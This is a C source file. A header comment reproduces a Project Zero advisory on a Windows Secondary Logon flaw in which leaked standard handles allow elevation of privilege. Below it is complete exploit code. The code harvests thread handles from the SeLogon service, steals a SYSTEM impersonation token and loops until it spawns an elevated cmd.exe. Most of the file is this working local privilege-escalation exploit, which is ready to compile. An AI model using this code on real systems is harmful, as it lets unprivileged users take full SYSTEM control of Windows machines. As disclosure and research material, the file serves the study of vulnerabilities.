/*
Sources: 
https://bugs.chromium.org/p/project-zero/issues/detail?id=687
https://googleprojectzero.blogspot.ca/2016/03/exploiting-leaked-thread-handle.html

Windows: Secondary Logon Standard Handles Missing Sanitization EoP
Platform: Windows 8.1, Windows 10, not testing on Windows 7
Class: Elevation of Privilege

Summary:
The SecLogon service does not sanitize standard handles when creating a new process leading to duplicating a system service thread pool handle into a user accessible process. This can be used to elevate privileges to Local System.

Description:

The APIs CreateProcessWithToken and CreateProcessWithLogon are exposed to user applications, however they’re actually implemented in a system service, Secondary Logon. When these methods are called it’s actually dispatched over RPC to the service. 

Both these methods take the normal STARTUPINFO structure and supports the passing of standard handles when the STARTF_USESTDHANDLES is used. Rather than the “standard” way of inheriting these handles to the new process the service copies them manually using the  SlpSetStdHandles function. This does something equivalent to:

BOOL SlpSetStdHandles(HANDLE hSrcProcess, HANDLE hTargetProcess, HANDLE handles[]) {
   foreach(HANDLE h : handles) {
     DuplicateHandle(hSrcProcesss, h, hTargetProcess, &hNewHandle, 0, FALSE, DUPLICATE_SAME_ACCESS);
   }
}

The vulnerability is nothing sanitizes these values. NtDuplicateObject special cases a couple of values for the source handle, Current Process (-1) and Current Thread (-2). NtDuplicateObject switches the thread’s current process to the target process when duplicating the handle, this means that while duplicating -1 will return a handle to the new process -2 will return a handle to the current thread which is actually a thread inside the svchost process hosting seclogon. When passing DUPLICATE_SAME_ACCESS for the current thread handle it's automatically given THREAD_ALL_ACCESS rights. The handle now exists in the new process and can be used by low privileged code.

This can be exploited in a number of ways. The new process can set the thread’s context causing the thread to dispatch to an arbitrary RIP. Or as these are thread pool threads servicing RPC requests for services such as BITS, Task Scheduler or seclogon itself you could do things like force a system level impersonation token (repeatedly) which overrides the security enforcement of these services leading to arbitrary file writes or process creation at Local System. It would be easy enough to run the exploit multiple times to capture handles to all thread pool threads available for RPC in the hosting process and then just keep trying until it succeeds.

One final point on exploitability. A normal user cannot use CreateProcessWithToken as the service checks that an arbitrary process can be opened by the user and has SeImpersonatePrivilege in its primary token. CreateProcessWithLogon will work but it seems you’d need to know a user’s password which makes it less useful for a malicious attacker. However you can specify the LOGON_NETCREDENTIALS_ONLY flag which changes the behaviour of LogonUser, instead of needing valid credentials the password is used to change the network password of a copy of the caller’s token. The password can be anything you like, it doesn’t matter.

Proof of Concept:

I’ve provided a PoC as a C# source code file. You need to compile it with Any CPU support (do not set 32 bit preferred). The PoC must match the OS bitness. 

1) Compile the C# source code file.
2) Execute the poc executable as a normal user. This will not work from low IL.
3) The PoC should display a message box on error or success.

Expected Result:
The call to CreateProcessWithLogon should fail and the PoC will display the error.

Observed Result:
The process shows that it’s captured a handle from a service process. If you check process explorer or similar you’ll see the thread handle has full access rights.
*/

#include <stdio.h>
#include <tchar.h>
#include <Windows.h>
#include <map>

#define MAX_PROCESSES 1000

HANDLE GetThreadHandle()
{
  PROCESS_INFORMATION procInfo = {};
  STARTUPINFO startInfo = {};
  startInfo.cb = sizeof(startInfo);

  startInfo.hStdInput = GetCurrentThread();
  startInfo.hStdOutput = GetCurrentThread();
  startInfo.hStdError = GetCurrentThread();
  startInfo.dwFlags = STARTF_USESTDHANDLES;

  if (CreateProcessWithLogonW(L"test", L"test", L"test", 
               LOGON_NETCREDENTIALS_ONLY, 
               nullptr, L"cmd.exe", CREATE_SUSPENDED, 
               nullptr, nullptr, &startInfo, &procInfo))
  {
    HANDLE hThread;   
    BOOL res = DuplicateHandle(procInfo.hProcess, (HANDLE)0x4, 
             GetCurrentProcess(), &hThread, 0, FALSE, DUPLICATE_SAME_ACCESS);
    DWORD dwLastError = GetLastError();
    TerminateProcess(procInfo.hProcess, 1);
    CloseHandle(procInfo.hProcess);
    CloseHandle(procInfo.hThread);
    if (!res)
    {
      printf("Error duplicating handle %d\n", dwLastError);
      exit(1);
    }

    return hThread;
  }
  else
  {
    printf("Error: %d\n", GetLastError());
    exit(1);
  }
}

typedef NTSTATUS __stdcall NtImpersonateThread(HANDLE ThreadHandle, 
      HANDLE ThreadToImpersonate, 
      PSECURITY_QUALITY_OF_SERVICE SecurityQualityOfService);

HANDLE GetSystemToken(HANDLE hThread)
{
  SuspendThread(hThread);

  NtImpersonateThread* fNtImpersonateThread = 
     (NtImpersonateThread*)GetProcAddress(GetModuleHandle(L"ntdll"), 
                                          "NtImpersonateThread");
  SECURITY_QUALITY_OF_SERVICE sqos = {};
  sqos.Length = sizeof(sqos);
  sqos.ImpersonationLevel = SecurityImpersonation;
  SetThreadToken(&hThread, nullptr);
  NTSTATUS status = fNtImpersonateThread(hThread, hThread, &sqos);
  if (status != 0)
  {
    ResumeThread(hThread);
    printf("Error impersonating thread %08X\n", status);
    exit(1);
  }

  HANDLE hToken;
  if (!OpenThreadToken(hThread, TOKEN_DUPLICATE | TOKEN_IMPERSONATE, 
                       FALSE, &hToken))
  {
    printf("Error opening thread token: %d\n", GetLastError());
    ResumeThread(hThread);    
    exit(1);
  }

  ResumeThread(hThread);

  return hToken;
}

struct ThreadArg
{
  HANDLE hThread;
  HANDLE hToken;
};

DWORD CALLBACK SetTokenThread(LPVOID lpArg)
{
  ThreadArg* arg = (ThreadArg*)lpArg;
  while (true)
  {
    if (!SetThreadToken(&arg->hThread, arg->hToken))
    {
      printf("Error setting token: %d\n", GetLastError());
      break;
    }
  }
  return 0;
}

int main()
{
  std::map<DWORD, HANDLE> thread_handles;
  printf("Gathering thread handles\n");

  for (int i = 0; i < MAX_PROCESSES; ++i) {
    HANDLE hThread = GetThreadHandle();
    DWORD dwTid = GetThreadId(hThread);
    if (!dwTid)
    {
      printf("Handle not a thread: %d\n", GetLastError());
      exit(1);
    }

    if (thread_handles.find(dwTid) == thread_handles.end())
    {
      thread_handles[dwTid] = hThread;
    }
    else
    {
      CloseHandle(hThread);
    }
  }

  printf("Done, got %zd handles\n", thread_handles.size());
  
  if (thread_handles.size() > 0)
  {
    HANDLE hToken = GetSystemToken(thread_handles.begin()->second);
    printf("System Token: %p\n", hToken);
    
    for (const auto& pair : thread_handles)
    {
      ThreadArg* arg = new ThreadArg;

      arg->hThread = pair.second;
      DuplicateToken(hToken, SecurityImpersonation, &arg->hToken);

      CreateThread(nullptr, 0, SetTokenThread, arg, 0, nullptr);
    }

    while (true)
    {
      PROCESS_INFORMATION procInfo = {};
      STARTUPINFO startInfo = {};
      startInfo.cb = sizeof(startInfo);     

      if (CreateProcessWithLogonW(L"test", L"test", L"test", 
              LOGON_NETCREDENTIALS_ONLY, nullptr, 
              L"cmd.exe", CREATE_SUSPENDED, nullptr, nullptr, 
              &startInfo, &procInfo))
      {
        HANDLE hProcessToken;
        // If we can't get process token good chance it's a system process.
        if (!OpenProcessToken(procInfo.hProcess, MAXIMUM_ALLOWED, 
                              &hProcessToken))
        {
          printf("Couldn't open process token %d\n", GetLastError());
          ResumeThread(procInfo.hThread);
          break;
        }
        // Just to be sure let's check the process token isn't elevated.
        TOKEN_ELEVATION elevation;
        DWORD dwSize = 0;
        if (!GetTokenInformation(hProcessToken, TokenElevation, 
                              &elevation, sizeof(elevation), &dwSize))
        {
          printf("Couldn't get token elevation: %d\n", GetLastError());
          ResumeThread(procInfo.hThread);
          break;
        }

        if (elevation.TokenIsElevated)
        {
          printf("Created elevated process\n");
          break;
        }

        TerminateProcess(procInfo.hProcess, 1);
        CloseHandle(procInfo.hProcess);
        CloseHandle(procInfo.hThread);
      }     
    }
  }

  return 0;
}